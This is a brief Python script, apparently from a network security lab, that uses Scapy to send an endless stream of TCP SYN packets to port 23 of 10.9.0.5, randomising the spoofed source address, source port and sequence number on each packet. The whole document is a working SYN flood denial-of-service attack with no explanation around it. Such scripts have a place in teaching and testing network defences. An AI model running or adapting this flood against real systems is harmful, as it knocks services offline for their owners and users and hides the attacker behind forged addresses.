#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="10.9.0.5") # destination ip
tcp = TCP(dport=23, flags='S') # destination port
pkt = ip/tcp

while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32))) # random source ip
    pkt[TCP].sport = getrandbits(16) # random source port
    pkt[TCP].seq   = getrandbits(32) # random sequence number
    send(pkt, verbose = 0)
